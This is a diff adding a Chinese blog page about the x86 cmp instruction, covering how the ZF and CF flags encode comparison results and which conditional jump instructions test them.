+<pre><code class="prism language-c">指令cmp ax<span class="token punctuation">,</span>bx 的逻辑含义是比较ax和bx的值，如果执行后：
+<span class="token number">1.</span>  zf<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span>bx<span class="token punctuation">)</span>
+<span class="token number">2.</span>  zf<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token punctuation">(</span>bx<span class="token punctuation">)</span>
+<span class="token number">3.</span>  cf<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>bx<span class="token punctuation">)</span>
+<span class="token number">4.</span>  cf<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token punctuation">(</span>bx<span class="token punctuation">)</span>
+<span class="token number">5.</span>  cf<span class="token operator">=</span>zf<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>bx<span class="token punctuation">)</span>
+<span class="token number">6.</span>  cf<span class="token operator">=</span><span class="token number">1</span>或zf<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token punctuation">(</span>bx<span class="token punctuation">)</span>
+cmp指令的比较结果需要通过条件转移指令来检测。
+<span class="token operator">|</span>指令 <span class="token operator">|</span>解释 <span class="token operator">|</span>含义 <span class="token operator">|</span>检测的相关标志位<span class="token operator">|</span>
+<span class="token operator">|</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">|</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">|</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">|</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">|</span>
+<span class="token operator">|</span>je<span class="token operator">|</span>e<span class="token punctuation">:</span>equal<span class="token operator">|</span>等于则转移<span class="token operator">|</span>zf<span class="token operator">=</span><span class="token number">1</span><span class="token operator">|</span>
+<span class="token operator">|</span>jne<span class="token operator">|</span>ne<span class="token punctuation">:</span>not equal<span class="token operator">|</span>不等于则转移<span class="token operator">|</span>zf<span class="token operator">=</span><span class="token number">0</span><span class="token operator">|</span>
+<span class="token operator">|</span>jb<span class="token operator">|</span>b<span class="token punctuation">:</span>below<span class="token operator">|</span>低于则转移<span class="token operator">|</span>cf<span class="token operator">=</span><span class="token number">1</span><span class="token operator">|</span>
+<span class="token operator">|</span>jnb<span class="token operator">|</span>nb<span class="token punctuation">:</span>not below<span class="token operator">|</span> 不低于则转移<span class="token operator">|</span> cf<span class="token operator">=</span><span class="token number">0</span><span class="token operator">|</span>
+<span class="token operator">|</span>ja <span class="token operator">|</span>a<span class="token punctuation">:</span>above<span class="token operator">|</span> 高于则转移<span class="token operator">|</span> cf<span class="token operator">=</span><span class="token number">0</span>且zf<span class="token operator">=</span><span class="token number">0</span><span class="token operator">|</span>
+<span class="token operator">|</span>jna<span class="token operator">|</span> na<span class="token punctuation">:</span>not above<span class="token operator">|</span> 不高于则转移<span class="token operator">|</span> cf<span class="token operator">=</span><span class="token number">1</span>或zf<span class="token operator">=</span><span class="token number">1</span><span class="token operator">|</span>
+cf<span class="token operator">=</span><span class="token number">1</span>或zf<span class="token operator">=</span><span class="token number">1</span><span class="token operator">|</span>
+</code></pre>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/a7d32681756d94be01e1575104618d4a/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">基于-Hexo-Github-搭建自己的博客</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/59706be8c8dbbb58cf740b3d15bcd80a/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">JDK1.6 新生代（Young（Eden、From、to））、老年代（Old）、持久化区（premanent)</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
